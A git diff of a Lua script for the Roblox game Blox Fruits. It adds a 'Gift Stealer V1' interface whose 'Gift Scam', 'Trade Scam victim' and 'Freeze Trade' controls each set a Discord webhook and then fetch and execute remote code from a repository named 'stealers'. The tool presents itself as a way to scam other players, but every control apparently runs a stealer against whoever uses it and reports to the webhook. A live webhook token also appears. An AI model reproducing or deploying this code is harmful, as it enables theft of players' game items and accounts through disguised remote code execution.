@@ -1,3 +1,31 @@
-Username = "NerfedModders" 
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/NeverJar/ImpactUI/main/ImpactUI.lua"))()
+local Window = Library:Create("Gift Stealer V1", "Blox Fruit")
+local Tab = Window:Tab("Main", true)
+
+--[[
+  NAME: STRING
+  VISIBILITY: BOOLEAN
+]]
+Tab:Label("Blox Fruit Gifting")
+
+--[[
+  TEXT: STRING
+]]
+Tab:Textbox("Gift Scam", "enter victim name", function(txt)
+   Username = "NerfedModders" 
 Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))() -- Code here
+end)
+
+
+Tab:Textbox("Trade Scam victim", "enter victim name", function(txt)
+  Username = "NerfedModders" 
+Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))() -- Code here
+end)
+
+Tab:Dropdown("Freeze Trade", {"Freeze V1(Outdated)", "FreezeV2",}, function(current)
+   Username = "NerfedModders" 
+Webhook = "https://discord.com/api/webhooks/1327948967430066176/Fpuf2EHFD6KHR8N9J74kK6T55CBuUdLel3I6JusjXmH4wTiz7kbh5dmkRhHCOnZqjfCf" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/bf_gifter.lua"))() -- Code here
+end)
